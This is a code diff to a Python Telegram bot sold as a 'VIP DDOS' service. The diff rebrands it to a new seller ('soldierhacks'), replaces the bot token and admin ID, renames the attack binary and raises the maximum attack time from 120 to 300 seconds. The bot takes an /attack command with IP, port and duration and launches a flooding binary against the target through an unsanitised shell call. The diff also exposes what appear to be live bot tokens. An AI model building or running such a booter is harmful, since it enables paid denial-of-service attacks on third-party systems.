@@ -3,8 +3,8 @@ import datetime
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7431527955:AAHUweIiRF2CaEVOFyICMttQyysTWc5xcz0'
-ADMIN_USER_ID = -1002217220568
+TELEGRAM_BOT_TOKEN = '7602354975:AAGw-4eEC7xcw1i2FtfItw6_vti5jIe5aAU'
+ADMIN_USER_ID = 5477802914
 USERS_FILE = 'users.txt'
 LOG_FILE = 'log.txt'
 attack_in_progress = False
@@ -69,9 +69,9 @@ def get_remaining_approval_time(user_id):
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*❤️Welcome to the RANBAL VIP DDOS ❤️*\n\n"
+        "*❤️Welcome to the soldierhacks VIP DDOS ❤️*\n\n"
         "*Use /attack <ip> <port> <duration>*\n"
-        "* DM TO BUY :- @MrRanDom8 *"
+        "* DM TO BUY :- @soldierhacks *"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -134,7 +134,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./ranbal {ip} {port} {duration} 800"
+        command = f"./2111 {ip} {port} {duration} 800"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -177,8 +177,8 @@ async def attack(update: Update, context: CallbackContext):
     ip, port, duration = args
     try:
         duration = int(duration)
-        if duration > 120:
-            response = "*⚠️ Error: Time interval must be less than or equal to 120 seconds.*"
+        if duration > 300:
+            response = "*⚠️ Error: Time interval must be less than or equal to 300 seconds.*"
             await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
             return
     except ValueError:
@@ -191,7 +191,7 @@ async def attack(update: Update, context: CallbackContext):
         f"*⚔️ Attack Launched! ⚔️*\n"
         f"*🎯 Target: {ip}:{port}*\n"
         f"*🕒 Duration: {duration} seconds*\n"
-        f"*🔥 Join :- https://t.me/MrRanDom8DDOS 💥*"
+        f"*🔥 Join :- @soldierhacks 💥*"
     ), parse_mode='Markdown')
 
     asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
